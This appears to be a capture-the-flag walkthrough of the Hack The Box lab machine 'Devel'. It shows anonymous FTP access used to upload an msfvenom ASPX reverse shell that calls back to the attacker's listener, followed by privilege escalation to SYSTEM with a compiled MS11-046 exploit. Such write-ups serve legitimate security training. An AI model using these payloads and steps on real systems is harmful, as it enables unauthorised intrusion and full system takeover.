**DEVEL**

Started with a standard nmap scan:

```
nmap -sV 10.129.79.188
```

FTP anonymous login is allowed, showing us the structure of an ASP.NET server:

```
25 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
```

Let's see if we can write files to it; let's create a `test.txt` file and try uploading it in the FTP session with `put test.txt`:

```
echo "test" > test.txt

put test.txt
```

The file was successfully uploaded:

```
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
10-06-26  06:56PM                    6 test.txt
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
```

Now we can upload a reverse shell.

Let's generate a reverse shell with Metasploit:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.194 LPORT=4444 -f aspx -o shell.aspx
```

Let's start a Metasploit listener with:

```
msf > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST 10.10.14.194
LHOST => 10.10.14.194
msf exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf exploit(multi/handler) > run
```

Let's visit `http://10.129.79.188/shell.aspx` to trigger the shell.

We land in a shell as `IIS APPPOOL\web`.

Let's see user privileges and groups with:

```
whoami /all
```

We see different important privileges, such as `SeImpersonate` privilege enabled.

Let's check the version with `systeminfo`:

```
Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          babis
Registered Organization:   
Product ID:                55041-051-0948536-86302
Original Install Date:     17/3/2017, 4:17:31   
System Boot Time:          6/10/2026, 6:51:15   
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2595 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     3.071 MB
Available Physical Memory: 2.450 MB
Virtual Memory: Max Size:  6.141 MB
Virtual Memory: Available: 5.521 MB
Virtual Memory: In Use:    620 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection 4
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.10.10.2
                                 IP address(es)
                                 [01]: 10.129.79.188
                                 [02]: fe80::91a5:9ab3:f7e9:39fb
                                 [03]: dead:beef::163:d849:e516:9de7
                                 [04]: dead:beef::91a5:9ab3:f7e9:39fb
```

This version is vulnerable to many exploits; we choose MS11-046, which affects the `afd.sys` driver and allows us to spawn a system shell in our current session.

```
searchsploit ms11-046
```

Output:

```
Microsoft Windows (x86) - 'afd.sys' Local Privilege Escalation (MS11-046) | windows_x86/local/40564.c
```

Let's copy the exploit to our Kali machine:

```
git clone https://github.com/appl3b0y/edb-40564-mingw-fix.git
cd edb-40564-mingw-fix
```

Let's compile it for Windows 32-bit:

```
i686-w64-mingw32-gcc ms11-046.c -o ms11-046.exe -lws2_32
```

Let's move to a writable folder and upload it via meterpreter:

```
cd C:\\Windows\\Temp

upload /home/kali/edb-40564-mingw-fix/ms11-046.exe
```

Let's execute the exploit:

```
C:\Windows\Temp\ms11-046.exe
```

We obtain a shell as SYSTEM; we find `user.txt` on babis's desktop and `root.txt` on the Administrator's desktop.
